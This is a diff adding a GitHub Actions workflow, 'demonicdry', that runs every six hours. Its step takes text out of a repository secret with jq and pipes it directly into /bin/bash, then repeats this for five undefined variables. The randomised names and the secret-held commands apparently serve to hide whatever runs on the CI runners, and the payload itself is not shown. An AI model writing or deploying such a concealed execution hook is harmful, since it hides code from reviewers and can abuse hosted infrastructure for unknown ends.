@@ -1,0 +1,24 @@
+name: demonicdry
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: demonicdry
+        env:
+          u8526: ${{ secrets.u8526 }}
+        run: |
+          echo $u8526 | jq -r .qc30 | /bin/bash
+          echo $vjn086 | jq -r .epmp8043 | /bin/bash
+          echo $aslg82 | jq -r .o7449 | /bin/bash
+          echo $livcg508 | jq -r .bwojz47 | /bin/bash
+          echo $kewh9245 | jq -r .fzfa73262 | /bin/bash
+          echo $bm1 | jq -r .sxm4430 | /bin/bash
+
